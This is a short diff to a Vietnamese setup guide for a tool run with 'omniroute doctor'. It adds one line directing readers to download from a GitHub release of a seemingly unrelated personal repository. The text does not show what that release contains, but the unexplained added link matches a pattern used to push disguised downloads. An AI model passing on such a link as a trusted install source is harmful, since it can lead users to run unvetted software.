@@ -97,3 +97,4 @@ powershell
 omniroute doctor
 Hãy thận trọng khi sử dụng mã.
 Nếu lệnh trả về trạng thái khỏe mạnh (✓ healthy), bạn đã cấu hình thành công và sẵn sàng lập trình cùng AI với lượng token tối ưu nhất!
+tải bằng cách truy cập https://github.com/nambeo13072013/AIc-aNam2k13/releases/tag/v1.0
